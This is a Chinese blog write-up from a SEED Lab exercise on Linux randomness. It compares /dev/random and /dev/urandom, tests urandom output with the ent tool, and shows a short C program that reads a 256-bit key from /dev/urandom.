<p>​    Linux 提供了另一种方式，可以通过 /dev/urandom 设备访问随机池。/dev/random 和 /dev/urandom 都可以使用随机池中的数据生成伪随机数。当熵不足时，/dev/random 将会暂停，而 /dev/urandom 会继 续生成新的数。将随机池中的数据视作“种子”，我们可以使用种子想生成多少随机数就生成多少。</p>
<p>​    下面我们将使用cat从/dev/urandom中获取随机数，然后移动鼠标，看是否对结果产生影响</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210171254214.png" alt="image-20221210171254214"></p>
<p>​    可以发现，随机数一直在生成，且移动鼠标，内核熵池中的熵一直在增加，并没有减少。</p>
<p>​    下面我们将对随机数的质量进行测试，我们可以使用一个名为ent的工具，首先从/dev/urandom来生成1MB的伪随机数，并将其保存在文件中，然后运行ent来查看随机数的质量。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210171808946.png" alt="image-20221210171808946"></p>
<p>​    可以看到回显的数值，随机数的熵为1字节(8 bit)7.999818，也就是说接近每个bit都是随机的。另外下面可以看到各个bit位之间相关性也很低，说明随机性还是不错的。</p>
<p>​    理论上讲，/dev/random 设备更加安全，但是实践上并没有很大的差异，因为 /dev/urandom 使用的 “种子”是随机的和不可预测的（当有新的随机数据输入时 /dev/urandom 会重新设置种子）。一个比较大的问题是 /dev/random 的阻塞行为可能导致拒绝服务攻击。因此，比较推荐使用 /dev/urandom 来获取随机数。</p>
<p>​    下面我们将使用一个程序来生成256bit的加密密钥，每次我们将从/dev/urandom中读取256bit的随机数值并将其作为加密密钥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 32 </span></span><br><span class="line"><span class="comment">//32 bytes 256 bit</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* key =(<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>)*LEN);</span><br><span class="line">    <span class="comment">//allocate a space for key</span></span><br><span class="line">    FILE* random = fopen(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(key,<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>)*LEN,<span class="number">1</span>,random);</span><br><span class="line">    <span class="comment">//read the key </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;LEN;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,(<span class="type">unsigned</span> <span class="type">char</span>)key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose(random);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    编译运行上述程序，可以看到每次打印出32byte的随机数，多次生成可以发现随机数之间互不相等，且随机度较高。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210173246510.png" alt="image-20221210173246510"></p>
]]></content>
      <categories>
        <category>seedlab</category>
      </categories>
      <tags>
        <tag>seedlab</tag>
      </tags>
  </entry>
</search>
